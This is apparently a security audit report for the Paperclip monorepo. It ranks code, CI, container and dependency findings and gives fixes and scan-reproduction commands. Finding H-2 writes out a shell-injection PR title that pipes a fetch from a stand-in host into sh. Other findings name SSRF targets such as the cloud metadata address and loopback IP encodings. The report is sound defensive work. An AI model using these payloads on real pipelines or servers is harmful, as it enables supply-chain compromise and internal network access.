# Paperclip Security Scan & Analysis

**Date:** 2026-05-18
**Scope:** Full monorepo at HEAD of `master` (commit `242a2c2`)
**Branch:** `claude/security-scan-analysis-5YJso`
**Methodology:** Industry-standard SAST + SCA + secret-scan + container/CI audit + manual review
**Tools used:**
- **Gitleaks 8.21.2** — secret detection in tracked files and git history
- **OSV-Scanner 2.0.1** (Google) — dependency vulnerabilities against OSV.dev
- **Trivy 0.70.0** (Aqua) — filesystem vulns, misconfigurations, secrets
- **Semgrep 1.163.0** with `p/javascript`, `p/typescript`, `p/security-audit`, `p/owasp-top-ten`, `p/nodejs`, `p/expressjs` — SAST
- **Manual review** — focused on auth/authz, crypto, SSRF, injection, secrets handling, CI/CD, containers

This report is structured to drive remediation: top of report is **prioritised fix backlog**; appendices contain raw evidence.

---

## 1. Executive summary

| Severity | Count | Examples |
|---|---|---|
| Critical | 1 | JWT secret reuse / weak default fallback |
| High | 9 | Outbound SSRF (HTTP adapter), Vite arbitrary file read, kysely SQL injection, tar path-traversal chain, undici DoS, GitHub Actions shell-injection, OAuth state confusion (better-auth), board-claim challenge in-memory, ZodError disclosure |
| Medium | 17 | DOMPurify XSS bypass chain, lodash code injection, picomatch ReDoS, MD5 ETag, GCM auth-tag length not enforced, cookie Secure-flag toggling on http://, CSRF only via Origin/Referer, missing email verification on cloud auto-provision, DNS-rebinding gap in private-hostname-guard, Trivy/Semgrep Dockerfile root, etc. |
| Low | 12+ | HEALTHCHECK missing, .dockerignore gaps, modulo bias in token alphabet, action SHA pinning, etc. |

**Aggregate dependency findings:** 54 vulnerable transitive/direct packages (21 HIGH, 30 MODERATE, 3 LOW) across 22 unique packages — most concentrated in `tar 6.2.1`, `vite`, `undici 5.29.0`, `kysely 0.28.11`, `dompurify 3.3.2`, `mermaid 11.12.3`, `lodash-es 4.17.23`, `fast-xml-parser 5.3.6`, `hono 4.12.12`.

**Top three remediations** that retire the most risk for the least effort:
1. **Bump dependencies** to fixed versions in §3 — closes ~50 CVEs and addresses every "high" finding from SCA. Most are pure minor/patch bumps; `tar 6→7` and `undici 5→6/7` need a smoke-test pass.
2. **Separate and validate the agent-JWT secret** — break the `BETTER_AUTH_SECRET` fallback in `server/src/agent-auth-jwt.ts:29` and `server/src/auth/better-auth.ts:95`, plus reject the `.env.example` default at boot when `NODE_ENV=production`.
3. **Apply `private-hostname-guard` to outbound calls** — the HTTP adapter (`server/src/adapters/http/execute.ts:19`) fetches any URL from agent/admin config with no SSRF guard. Centralise an `assertNonPrivateUrl()` and call it everywhere we `fetch`/`http.request` to an externally-supplied URL.

---

## 2. Application-code findings (manual + Semgrep)

Each item is listed with `severity`, `file:line`, `CWE`, **impact**, and **fix direction**. Items are deduped against the dependency list in §3 (those are tracked as a single bulk-bump task).

### 2.1 CRITICAL

#### C-1. Shared / weakly-defaulted JWT signing secret
- **Severity:** CRITICAL · **CWE-330, CWE-321, CWE-347**
- **Files:**
  - `server/src/agent-auth-jwt.ts:29` — `process.env.PAPERCLIP_AGENT_JWT_SECRET?.trim() || process.env.BETTER_AUTH_SECRET?.trim()`
  - `server/src/auth/better-auth.ts:95` — same secret reused for Better-Auth sessions
  - `.env.example:4` — ships `BETTER_AUTH_SECRET=paperclip-dev-secret` (40-bit entropy, predictable string)
- **Impact:** A single 13-byte default secret signs both **session cookies** and **agent JWTs**. An operator who leaves the default in place — or anyone who knows the example — can forge JWTs as any agent and Better-Auth session cookies as any user. The `||` fallback also means anyone with read access to `BETTER_AUTH_SECRET` can mint agent JWTs even without `PAPERCLIP_AGENT_JWT_SECRET`.
- **Fix:**
  1. Generate distinct secrets per purpose; remove the `||` fallback.
  2. At startup, **fail closed** if `NODE_ENV=production` and either secret is missing, shorter than 32 bytes, or equals `paperclip-dev-secret`. The startup banner already warns — escalate to a process exit.
  3. Consider moving agent JWTs to RS256 (asymmetric) so the verifying server doesn't hold the minting key.
  4. Replace `.env.example` value with `<generate-with-openssl-rand-base64-32>` placeholder.

### 2.2 HIGH

#### H-1. Unrestricted outbound URL in HTTP adapter (SSRF)
- **Severity:** HIGH · **CWE-918**
- **File:** `server/src/adapters/http/execute.ts:19`
- **Detail:** `await fetch(url, ...)` where `url = asString(config.url, "")` is taken straight from adapter config. No allow-list, no DNS check, no private-IP block, no port restriction.
- **Impact:** Whoever can author an HTTP adapter (admins today, plugin authors in future) can pivot the server to `http://169.254.169.254/...` (cloud metadata), `http://127.0.0.1:5432` (Postgres unix endpoints), or any other LAN target the Paperclip host can reach.
- **Fix:** Reuse the same private-IP logic as `server/src/middleware/private-hostname-guard.ts`, factored into a helper `assertPublicUrl(url)`. Call it before `fetch`. Apply the helper to every other place that fetches a URL from config (plugin proxy in `routes/plugin-ui-static.ts:358`, DNS-resolved invite endpoint in `routes/access.ts`, any webhook executor). Resolve **post-DNS** to defeat rebinding.

#### H-2. GitHub Actions `run:` shell-injection (3 sites)
- **Severity:** HIGH · **CWE-78** · Semgrep `yaml.github-actions.security.run-shell-injection`
- **Files:**
  - `.github/workflows/release-smoke.yml:65`
  - `.github/workflows/release.yml:198`
  - `.github/workflows/release.yml:247`
- **Impact:** `${{ github.* }}` data — branch names, PR titles, tag names — is interpolated directly into shell. A PR titled `"; curl evil | sh #` runs in the runner with `GITHUB_TOKEN` + any secrets exposed at the job level. `release.yml` has publish permissions and access to npm credentials, so this is a supply-chain compromise vector.
- **Fix:** Quote-isolate by passing through env vars, e.g.
  ```yaml
  env:
    BRANCH: ${{ github.head_ref }}
  run: |
    echo "$BRANCH"
  ```

#### H-3. Board-claim challenge stored in process memory
- **Severity:** HIGH · **CWE-613**
- **File:** `server/src/board-claim.ts:21,34-41,63-65,143-146`
- **Impact:** The bootstrap claim flow keeps the challenge in a module-level `activeChallenge` variable. Two failure modes: (a) restart drops in-flight claims silently; (b) **load-balanced or multi-replica deployments break** because each replica has its own challenge, so a TOCTOU race between replicas exists where the same code might be redeemed twice. There's also no per-IP rate limit, so an attacker who reaches the bootstrap endpoint can brute the short claim code.
- **Fix:** Persist challenge state to the DB with a `claimed_at` column and an idempotency key; add rate-limit + lockout after N failures; add a short server-side expiry independent of memory state.

#### H-4. ZodError details returned to client
- **Severity:** HIGH (info disclosure) · **CWE-209**
- **Files:**
  - `server/src/middleware/error-handler.ts:59-62`
  - `server/src/middleware/validate.ts:4-8`
- **Impact:** Raw Zod `.errors` array including paths, codes, expected types, and discriminator hints is returned in 400 responses. This is the API equivalent of leaking the schema — accelerates fuzzing, IDOR/role-bypass discovery, and reveals hidden fields meant for internal use only.
- **Fix:** Return `{ error: "Validation error", fields: paths }` only (no codes, no messages). Keep full detail in server logs.

#### H-5. CSRF protection scope gaps
- **Severity:** HIGH (depends on cookie config) · **CWE-352**
- **File:** `server/src/middleware/board-mutation-guard.ts:38-87`, `server/src/auth/better-auth.ts:103`
- **Impact:** Mutation guard relies on `Origin`/`Referer` matching; bypasses include reverse proxies that strip those headers (currently rejected — good) and several actor types (`board_key`, `local_implicit`) which **skip CSRF entirely**. Combined with `disableSecureCookies` toggling off `Secure` for any `http://` `PAPERCLIP_PUBLIC_URL` (line 103) — including Tailnet, VPN, or LAN deployments — this means a browser-loaded session cookie can be replayed in cleartext and used cross-origin.
- **Fix:**
  1. In `better-auth.ts`, restrict `disableSecureCookies` to `127.0.0.1` / `localhost` only — not the entire `http://` scheme.
  2. Force `SameSite=Strict` (or `Lax` minimum) on every auth cookie; verify in the Better-Auth advanced options.
  3. Document that board API keys must be server-to-server only and never embedded in a browser context.
  4. Add a defence-in-depth CSRF token (double-submit) for SPA-initiated mutations.

#### H-6. Cloud-tenant header opens auto-admin provisioning
- **Severity:** HIGH · **CWE-269, CWE-307**
- **File:** `server/src/middleware/auth.ts:218-249,326-330`
- **Impact:** Any caller presenting a valid `x-paperclip-cloud-tenant-server-token`:
  - Auto-creates an auth user, marks `emailVerified: true` without any verification step.
  - Receives owner membership in **all** companies via `onConflictDoNothing`.
  - Token comparison is timing-safe but has no rate-limit / lockout, so a brute-force is bandwidth-bound only.
- **Fix:** Require actual email-verification step; treat stack role (`owner`/`member`/`support`) explicitly instead of granting universal admin; add per-IP rate limit + exponential back-off on failed header validations; alert on bursts.

#### H-7. Agent JWTs are not revocable
- **Severity:** HIGH · **CWE-613**
- **File:** `server/src/middleware/auth.ts:139-170`, `server/src/agent-auth-jwt.ts:68-93`
- **Impact:** TTL defaults to **48 hours** with no `jti` claim and no server-side revocation list. Deleted/terminated agents continue to authenticate for up to 48h. Compromised JWTs cannot be invalidated short of rotating the signing secret (which invalidates every other agent simultaneously).
- **Fix:** Add `jti: randomUUID()` to claims; check against a revocation table (`agent_jwt_revocations`) on every verify; revoke entries on agent terminate/delete; lower default TTL to ≤ 1h with a refresh flow.

#### H-8. DNS-rebinding gap in `private-hostname-guard`
- **Severity:** HIGH · **CWE-918**
- **File:** `server/src/middleware/private-hostname-guard.ts:3-19`
- **Impact:** Only inspects `Host`/`X-Forwarded-Host` strings; no DNS resolution check, no IPv6 normalisation (`[::1]` vs `::1`), no rejection of numeric/decimal/octal/hex IP encodings of loopback (e.g. `2130706433`). A controlled DNS record that initially resolves to a public IP can flip to `127.0.0.1` between the connection check and the actual fetch.
- **Fix:** Pre-resolve hostnames at request time; reject if any resolved IP is RFC1918 / loopback / link-local / multicast / unique-local-IPv6; normalise IPs through `net.isIP` and reject non-canonical forms.

#### H-9. SVG asset sanitiser uses DOMPurify 3.3.2 (known XSS bypasses)
- **Severity:** HIGH (compound with §3 deps) · **CWE-79**
- **File:** `server/src/routes/assets.ts:21-83` (+ `ui/src/components/MarkdownBody.tsx:435-488`)
- **Impact:** Already has good defence-in-depth (JSDOM rebuild, `FORBID_TAGS`, `FORBID_CONTENTS`, custom hook). But DOMPurify 3.3.2 has four open advisories (§3) including `FORBID_TAGS` bypass via function-form `ADD_TAGS` and prototype-pollution → XSS. Upload an SVG that triggers any of these and stored XSS lands in the UI.
- **Fix:** Bump DOMPurify to ≥ 3.4.0 (closes all four). Add an explicit unit test for `<use xlink:href="...">` and `<use href="data:...">` after the bump.

### 2.3 MEDIUM

#### M-1. GCM auth-tag length not validated on decrypt
- **Severity:** MEDIUM · **CWE-310** · Semgrep `javascript.node-crypto.security.gcm-no-tag-length`
- **File:** `server/src/secrets/local-encrypted-provider.ts:208-215`
- **Impact:** `createDecipheriv("aes-256-gcm", masterKey, iv)` then `decipher.setAuthTag(tag)` accepts any tag length ≥ 4 bytes. A truncated tag dramatically increases forgery probability. Tag values come from stored material in the DB, so this matters if an attacker can write to that table.
- **Fix:** Validate `if (tag.length !== 16) throw badRequest("Invalid tag")` before `setAuthTag`, or pass `{ authTagLength: 16 }` to `createDecipheriv`.

#### M-2. MD5 used for ETag
- **Severity:** MEDIUM · **CWE-327** · OWASP A02
- **File:** `server/src/routes/plugin-ui-static.ts:172`
- **Impact:** MD5 collisions are trivial; could be abused for cache-poisoning if a path exists where an attacker controls bytes hashed into the ETag. Mostly a hygiene issue.
- **Fix:** Switch to `createHash("sha256").update(...).digest("hex").slice(0, 16)` — same ETag width, sound primitive.

#### M-3. Secure-cookie flag dropped for any `http://` deploy URL
- **Severity:** MEDIUM · **CWE-614**
- **File:** `server/src/auth/better-auth.ts:103,123`
- **Detail:** `const isHttpOnly = publicUrl ? publicUrl.startsWith("http://") : false;` then `disableSecureCookies: isHttpOnly`. Any deploy behind a Tailnet/VPN/LAN proxy that terminates TLS upstream but advertises an `http://` `PAPERCLIP_PUBLIC_URL` ships cookies without `Secure`.
- **Fix:** Allow-list loopback hostnames only (`localhost`, `127.0.0.1`, `[::1]`) for `disableSecureCookies`; everything else stays Secure.

#### M-4. Plugin DB schema name interpolated into `sql.raw`
- **Severity:** MEDIUM · **CWE-89**
- **File:** `server/src/services/plugin-database.ts:305,376`
- **Detail:** `CREATE SCHEMA IF NOT EXISTS ${quoteIdentifier(namespaceName)}` via `sql.raw`. Today protected by `assertIdentifier()` (regex `^[A-Za-z_][A-Za-z0-9_]*$`) — safe in isolation, but `sql.raw(statement)` short-circuit when `params.length === 0` is a fragile pattern that future refactors can break.
- **Fix:** Remove the `sql.raw` short-circuit; always go through parameterised builder; add a regression test asserting `assertIdentifier("evil; DROP --")` throws.

#### M-5. `pg_dump`/`psql` path read from env without validation
- **Severity:** MEDIUM · **CWE-78, CWE-426**
- **File:** `packages/db/src/backup-lib.ts:292-296,323-327`
- **Detail:** `process.env.PAPERCLIP_PG_DUMP_PATH || "pg_dump"` — if env is attacker-controlled (compromised secrets file, malicious operator), arbitrary binary runs. Connection string is also embedded as `--dbname=...` argv which is generally safe but exposes credentials in `ps`.
- **Fix:** Resolve to absolute path; reject relative paths; refuse non-existent binaries; use `PGPASSFILE` / env-var-based password injection so `--dbname=` doesn't carry credentials.

#### M-6. `sql.unsafe()` predicate helper in backup tooling
- **Severity:** MEDIUM (low exploitability today, fragile) · **CWE-89**
- **File:** `packages/db/src/backup-lib.ts:567,580,606,778,815,834` calling `nonSystemSchemaPredicate(identifier)`
- **Fix:** Bind known identifiers as an enum; never accept caller-supplied strings; add a lint rule banning new `sql.unsafe()` outside this file.

#### M-7. ANTHROPIC_API_KEY at job-level env in PR workflow
- **Severity:** MEDIUM · **CWE-200**
- **File:** `.github/workflows/e2e.yml:17`
- **Impact:** Job-level env exposes the key to every step, including third-party actions in the same job. Easier to exfiltrate than a step-scoped env.
- **Fix:** Move to per-step `env:` only on the step that actually needs it.

#### M-8. Secrets echoed in release-smoke workflow
- **Severity:** MEDIUM · **CWE-532**
- **File:** `.github/workflows/release-smoke.yml:79-80`
- **Impact:** `echo "SMOKE_ADMIN_PASSWORD=$SMOKE_ADMIN_PASSWORD"` writes a secret into the Actions log. Logs are visible to anyone with read access to the repo.
- **Fix:** Remove the echo; if a debug knob is needed, gate behind `if: env.RUNNER_DEBUG == '1'` and use `::add-mask::`.

#### M-9. `refresh-lockfile.yml` permissions too broad
- **Severity:** MEDIUM · **CWE-732**
- **File:** `.github/workflows/refresh-lockfile.yml:17-19`
- **Detail:** `contents: write, pull-requests: write` allows force-pushes / approve-and-merge by the bot.
- **Fix:** Drop to the minimum (`pull-requests: write` only if the bot opens PRs; rely on branch-protection rules for the merge step).

#### M-10. `workflow_dispatch` accepts any ref
- **Severity:** MEDIUM · **CWE-284**
- **File:** `.github/workflows/release.yml:8-22` (`inputs.source_ref`)
- **Fix:** Validate `source_ref` against `refs/heads/master` or release tag patterns before running publish steps.

#### M-11. Container/runtime hardening
- **Severity:** MEDIUM aggregate · **CWE-250, CWE-1021**
- **Files:** `Dockerfile`, `docker/openclaw-smoke/Dockerfile`, `docker/Dockerfile.onboard-smoke`, `docker/untrusted-review/Dockerfile`, `packages/plugins/sandbox-providers/cloudflare/bridge-template/Dockerfile`
- **Detail:** Trivy + Semgrep both flag root user (`DS-0002`, `missing-user`). `docker/untrusted-review/Dockerfile` is **especially concerning** because it intentionally runs untrusted PR code with no `--security-opt=no-new-privileges`, no read-only root, no dropped caps, no seccomp.
- **Fix:**
  - Add a non-root `USER node` (or dedicated UID) before final CMD in every Dockerfile.
  - For `untrusted-review`: enforce `--security-opt=no-new-privileges`, read-only `/`, `--cap-drop=ALL`, mount only `/work`, restrict network egress.
  - Pin base images by digest (`@sha256:...`).

#### M-12. Base-image tag pinning
- **Severity:** MEDIUM (supply-chain) · **CWE-829**
- **Files:** all five Dockerfiles
- **Fix:** Replace `node:22-alpine`, `lts-trixie-slim`, `24.04`, `cloudflare/sandbox:0.7.0` etc. with digest-pinned variants; rotate via Renovate.

#### M-13. GitHub Action `@vX` references not SHA-pinned
- **Severity:** MEDIUM · **CWE-829**
- **Files:** `.github/workflows/*.yml`
- **Fix:** Pin third-party actions to commit SHAs; first-party `actions/*` can stay on major versions, but Aqua/Docker/external should be SHA-pinned. Add a `step-security/harden-runner` step for additional egress control.

#### M-14. `disableSecureCookies` decision should also gate `Cookie: HttpOnly`
- **Severity:** MEDIUM (already covered conceptually under M-3) — kept separately to clarify Better-Auth `advanced` options should be explicitly set `httpOnly:true, sameSite:"strict"` rather than relying on defaults.

#### M-15. Email-verification bypass on cloud auto-provision (already H-6 — kept under H-6)

#### M-16. Validation error → schema disclosure (already H-4 — kept under H-4)

#### M-17. SVG `<use xlink:href="...">` not explicitly stripped
- **Severity:** MEDIUM · **CWE-611, CWE-918**
- **File:** `server/src/routes/assets.ts:40-83`
- **Fix:** After the DOMPurify pass, walk the resulting DOM and explicitly remove `<use>` elements (or strip both `href` and `xlink:href` attributes), and forbid any URL scheme other than fragment (`#id`).

### 2.4 LOW

| ID | File:line | Issue | Fix |
|---|---|---|---|
| L-1 | `server/src/routes/access.ts:101-106` | Token alphabet 36 chars, `bytes[idx] % 36` has slight modulo bias | Use rejection sampling; or expand bytes to 16 and slice |
| L-2 | `server/src/agent-auth-jwt.ts:68-93` | No `jti` (also see H-7) | Add `randomUUID()` |
| L-3 | All Dockerfiles | Missing `HEALTHCHECK` | Add `HEALTHCHECK CMD ...` |
| L-4 | `.dockerignore` | Missing `*.env*`, `.npmrc.local`, `Dockerfile*`, `.github`, `.idea`, `.vscode` | Append to ignore list |
| L-5 | gitleaks: `server/src/__tests__/redaction.test.ts`, `heartbeat-active-run-output-watchdog.test.ts`, `packages/plugins/sandbox-providers/exe-dev/src/plugin.test.ts` | Test fixtures contain placeholder JWT / PAT / RSA private key (intentional, but tracked by gitleaks) | Mark with `// gitleaks:allow` inline pragma or move fixtures to a `.fixtures/` dir excluded by `.gitleaksignore` |
| L-6 | `docs/deploy/secrets.md:394` | Example secret string flagged | Replace with `<REDACTED>` literal |
| L-7 | `server/src/middleware/auth.ts:329` | Length-compare before `timingSafeEqual` (correct, but worth a comment) | Add comment "length is not secret; length-compare is required for timingSafeEqual" |

---

## 3. Dependency vulnerabilities (SCA — OSV + Trivy)

54 distinct vulnerability instances across 22 unique packages from `pnpm-lock.yaml`. Listed by package below — fixed-version is the **lowest** version that closes the advisory.

### 3.1 HIGH — fix first

| Package | Current | Fix to | Advisories | Notes |
|---|---|---|---|---|
| **tar** | 6.2.1 | **≥ 7.5.11** | GHSA-34x7-hfp2-rc4v, GHSA-83g3-92jg-28cx, GHSA-8qq5-rm4j-mr97, GHSA-9ppj-qmqm-q256, GHSA-qffp-2rhf-9h96, GHSA-r6q2-hw4h-h46w | 6 HIGH advisories on path-traversal & symlink poisoning; major bump, verify usage path |
| **vite** | 6.4.1 & 7.3.1 | **6.4.2 / 7.3.2** | GHSA-p9ff-h696-f583, GHSA-v2wj-q39q-566r, GHSA-4w7w-66w2-5vf9 | Patch-level bump |
| **kysely** | 0.28.11 | **≥ 0.28.17** | GHSA-8cpq-38p9-67gx, GHSA-pv5w-4p9q-p3v2, GHSA-wmrf-hv6w-mr66 | MySQL SQLi + JSON-path traversal — patch-level |
| **undici** | 5.29.0 | **≥ 6.24.0 / 7.24.0** | GHSA-vrm6-8vpv-qv8q, GHSA-v9p9-hfj2-hcw8, GHSA-4992-7rv2-5pvq, GHSA-2mjp-6q6p-2qxm, GHSA-g9mf-h72j-4rw9 | WS DoS + CRLF + smuggling; major bump |
| **fast-uri** | 3.1.0 | **≥ 3.1.2** | GHSA-q3j6-qgpj-74h6, GHSA-v39h-62p7-jpjc | Path-traversal + host-confusion |
| **fast-xml-parser** | 5.3.6 | **≥ 5.5.7** | GHSA-8gc5-j5rx-235r, GHSA-jp2q-39xq-3w4g, GHSA-gh4j-gqv2-49f6, GHSA-fj3w-jwp8-x2g3 | Entity expansion bypasses + CDATA injection |
| **path-to-regexp** | 8.3.0 | **≥ 8.4.0** | GHSA-j3q9-mxjg-w52f, GHSA-27v5-c462-wpq7 | ReDoS |
| **picomatch** | 4.0.3 | **≥ 4.0.4** | GHSA-c2c7-rcm5-vvqj, GHSA-3v7f-55p6-f55p | ReDoS + glob injection |
| **lodash-es** | 4.17.23 | **≥ 4.18.0** | GHSA-r5fr-rjxr-66jc, GHSA-f23m-r3pf-42rh | Code injection via `_.template`; prototype pollution |
| **defu** | 6.1.4 | **≥ 6.1.5** | GHSA-737v-mqg7-c878 | Prototype pollution |

### 3.2 MODERATE — fix in same wave

| Package | Current | Fix to | Advisories |
|---|---|---|---|
| **dompurify** | 3.3.2 | **≥ 3.4.0** | GHSA-39q2-94rc-95cp, GHSA-v9jr-rg53-9pgp, GHSA-crv5-9vww-q3g8, GHSA-h7mw-gpvr-xq4m |
| **mermaid** | 11.12.3 | **≥ 11.15.0** | GHSA-6m6c-36f7-fhxh, GHSA-87f9-hvmw-gh4p, GHSA-ghcm-xqfw-q4vr, GHSA-xcj9-5m2h-648r |
| **hono** | 4.12.12 | **≥ 4.12.18** | GHSA-9vqf-7f2p-gf9v, GHSA-69xw-7hcm-h432, GHSA-458j-xx4x-4375, GHSA-qp7p-654g-cw7p, GHSA-p77w-8qqv-26rm, GHSA-hm8q-7f3q-5f36 |
| **better-auth** | 1.4.18 | **≥ 1.6.2** | GHSA-wxw3-q3m9-c3jr — OAuth state confusion (cookie-backed state without PKCE) |
| **@anthropic-ai/sdk** | 0.81.0 | **≥ 0.91.1** | GHSA-p7fg-763f-g4gf — insecure default permissions on memory-tool files |
| **ip-address** | 10.1.0 | **≥ 10.1.1** | GHSA-v2v4-37r5-5v8g — XSS in Address6 HTML emitters |
| **postcss** | 8.5.6 | **≥ 8.5.10** | GHSA-qx2v-qp2m-jg93 — XSS via unescaped `</style>` |
| **uuid** | 11.1.0 | **≥ 11.1.1** | GHSA-w5hq-g745-h8pq — buffer bounds check missing |
| **esbuild** | 0.18.20 | **≥ 0.25.0** | GHSA-67mh-4wv8-2f99 — dev server CSRF |
| **brace-expansion** | 5.0.5 | **≥ 5.0.6** | GHSA-jxxr-4gwj-5jf2 — DoS |

### 3.3 LOW

| Package | Fix to | Advisory |
|---|---|---|
| @tootallnate/once 1.1.2 | ≥ 3.0.1 | GHSA-vpq2-c234-7xj6 |

### 3.4 Suggested rollout

1. Branch `chore/security-deps-bump` (or per-package bumps).
2. `pnpm up tar@^7 undici@^6 kysely@^0.28 vite@^7 fast-uri@^3 fast-xml-parser@^5 path-to-regexp@^8 picomatch@^4 lodash-es@^4 defu@^6` then re-run `pnpm install --lockfile-only && pnpm audit`.
3. `pnpm up dompurify mermaid hono better-auth @anthropic-ai/sdk ip-address postcss uuid esbuild brace-expansion`.
4. `pnpm test:run` and `test:e2e` to catch breaking changes (notably `tar 6→7` API, `undici 5→6` types).
5. Re-run `/tmp/sectools/osv-scanner scan source --recursive .` to confirm zero HIGH remaining.

---

## 4. Secret-scan findings (Gitleaks)

7 raw matches, all classified below. Two are real and the rest are false positives — but the rule pattern should be silenced explicitly to keep the signal-to-noise ratio high.

| File:line | Rule | Real? | Action |
|---|---|---|---|
| `packages/plugins/sandbox-providers/exe-dev/src/plugin.test.ts:229` | private-key | False positive — test fixture | Add `// gitleaks:allow` or move to fixture dir |
| `docs/deploy/secrets.md:394` | generic-api-key | False positive — doc example | Replace example with `"sk_example_REPLACE_ME"` |
| `server/src/__tests__/heartbeat-active-run-output-watchdog.test.ts:221-222` | jwt + github-pat | False positive — test fixtures | `gitleaks:allow` |
| `server/src/__tests__/redaction.test.ts:68-69` | jwt + github-pat | False positive — test fixtures used to verify the redaction code | `gitleaks:allow` |
| `server/src/routes/access.ts:89` | generic-api-key | **False positive** — `INVITE_TOKEN_ALPHABET` is `"abcdefghijklmnopqrstuvwxyz0123456789"` | `gitleaks:allow` |

No real secrets are committed at HEAD. Once these are pragma-ed, `gitleaks detect` should return 0 — making it safe to enforce in pre-commit / CI.

---

## 5. Tooling outputs (artefacts on disk)

| Tool | Raw output | Notes |
|---|---|---|
| Gitleaks | `/tmp/scans/gitleaks.json` (40 KB) | 7 findings (see §4) |
| OSV-Scanner | `/tmp/scans/osv.json` (322 KB), summary `/tmp/scans/osv-summary.txt` | 54 vulns, 22 packages |
| Trivy | `/tmp/scans/trivy.json` (795 KB) | 53 vulns + 8 misconfigs |
| Semgrep | `/tmp/scans/semgrep.json` | 9 findings (3 GH-Actions shell-injection, 3 Dockerfile root, 1 GCM, 2 plugin-ui-static warnings) |

These are saved in the ephemeral container and will not survive the next session — re-run before fix verification.

---

## 6. Reproducing the scans

```bash
# Tools
mkdir -p /tmp/sectools && cd /tmp/sectools
curl -sL https://github.com/gitleaks/gitleaks/releases/download/v8.21.2/gitleaks_8.21.2_linux_x64.tar.gz | tar xz
curl -sL https://github.com/google/osv-scanner/releases/download/v2.0.1/osv-scanner_linux_amd64 -o osv-scanner && chmod +x osv-scanner
curl -sL https://github.com/aquasecurity/trivy/releases/download/v0.70.0/trivy_0.70.0_Linux-64bit.tar.gz | tar xz
pip install --user --break-system-packages semgrep

# Scans (from repo root)
cd /home/user/paperclip
/tmp/sectools/gitleaks detect --source . --report-format json --report-path gitleaks.json --redact --no-banner
/tmp/sectools/osv-scanner scan source --recursive --format json . > osv.json
/tmp/sectools/trivy fs --scanners vuln,secret,misconfig --format json -o trivy.json --skip-dirs node_modules .
~/.local/bin/semgrep --config=p/javascript --config=p/typescript --config=p/security-audit \
  --config=p/owasp-top-ten --config=p/nodejs --config=p/expressjs \
  --exclude=node_modules --exclude='**/__tests__/**' --exclude='**/*.test.ts' \
  --json --output=semgrep.json --metrics=off --timeout=180 --jobs=4
```

---

## 7. Fix plan (recommended sequence)

| Wave | Target | Estimated effort | Risk reduced |
|---|---|---|---|
| 1 | Dependency bumps §3.1 (HIGH) | 2-4 hrs incl. smoke | ~21 HIGH CVEs |
| 2 | C-1 JWT secret separation, H-1 outbound SSRF helper, H-2 GH-Actions fixes | 1 day | All critical + 3 HIGH |
| 3 | H-3 board claim persistence, H-4 ZodError redaction, H-5/M-3 cookie hardening, H-6 cloud auto-provision, H-7 JWT revocation, H-8 DNS-rebinding | 2-3 days | 5 HIGH |
| 4 | Dependency bumps §3.2 (MODERATE) | 4-6 hrs incl. smoke | ~30 MODERATE CVEs |
| 5 | M-1 GCM tag length, M-2 SHA-256 ETag, M-4 plugin-DB sql.raw, M-5 pg_dump path validation, M-11/12/13 container & action pinning, M-17 SVG `<use>` strip | 1-2 days | All remaining MEDIUM |
| 6 | LOW table §2.4 + gitleaks-pragmas | 0.5 day | Hygiene + clean CI signal |

Total: roughly **1 week** for a focused engineer to retire every high-severity finding.

---

## 8. Out of scope (not assessed)

- Runtime testing against a live deployment (dynamic analysis / DAST).
- Penetration test of plugin sandbox isolation (`exe-dev`, `cloudflare`, `e2b` providers) — requires live sandbox accounts.
- Cross-tenant data-isolation tests at the SQL layer (would need a populated DB).
- LLM prompt-injection attack surface in agent runtimes (see also `paperclip-plugin-fake-sandbox` references) — needs threat-model session.
- Threat model / data-flow diagram — recommend follow-up.

